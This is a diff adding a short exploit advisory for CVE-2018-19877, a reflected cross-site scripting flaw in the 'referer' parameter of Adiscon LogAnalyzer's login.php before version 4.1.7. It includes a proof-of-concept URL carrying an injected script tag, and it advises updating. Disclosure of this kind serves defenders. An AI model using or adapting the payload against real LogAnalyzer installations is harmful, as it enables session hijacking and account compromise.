@@ -1,0 +1,22 @@
+# Exploit Title: Adiscon LogAnalyzer 4.1.7 - Cross-Site Scripting
+# Date: 2018-12-05
+# Software Link: *httpås://loganalyzer.adiscon.com/
+# <https://loganalyzer.adiscon.com/> https://github.com/rsyslog/loganalyzer
+# <https://github.com/rsyslog/loganalyzer>*
+# Exploit Author: Gustavo Sorondo
+# Contact: http://twitter.com/iampuky
+# Website: http://cintainfinita.com/
+# CVE: CVE-2018-19877
+# Category: webapps
+
+# 1. Description
+# Adiscon LogAnalyzer  before 4.1.7 is affected by Cross-Site Scripting (XSS)
+# in the 'referer' parameter of the login.php file.
+
+# 2. Proof of Concept
+
+http://my.loganalyzer.instance/login.php?referer=%22%3E%3Cscript%3Ealert('Cinta%20Infinita')%3C/script%3E
+
+# 3. Solution:
+# Update to version 4.1.7.
+# https://loganalyzer.adiscon.com/news/loganalyzer-v4-1-7-v4-stable-released/
